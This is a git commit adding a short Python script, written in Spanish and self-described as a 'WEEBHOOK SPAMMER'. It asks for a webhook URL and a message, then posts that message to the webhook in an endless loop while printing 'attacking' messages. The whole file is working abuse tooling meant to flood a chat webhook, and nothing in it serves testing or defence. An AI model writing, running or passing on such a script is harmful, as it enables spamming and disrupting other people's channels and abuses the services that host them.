a53a3fa3dfb7eca7e5bf60f6972b028196d5c4ab
SAUL <saul.brawl.1@gmail.com>
2025-10-06 12:37:28 +0200

    Create weebhook.py

---
+++ weebhook.py
@@ -0,0 +1,28 @@
+import requests
+import time
+#Made by MEXXIR
+
+try:
+    print("Bienvenido al WEEBHOOK SPAMMER ( Made by MEXIR)")
+
+    USUARIO = input("Ingrese el lINK de su webhook:  ")
+
+
+    link =input("Ingrese mensaje o link a espamear:  ")
+#mejorar esto xd
+except :
+    print("Error")
+    time.sleep(2)
+    exit()
+
+
+
+
+print("Atacando webhook...")
+time.sleep(2)
+while True:
+   requests.post(USUARIO, json={"content": link})
+
+   print("Enviando ataque HTTP...")
+    
+#AÑADIR MANEJO DE ERRORES complejo  (ME DA PEREZA)
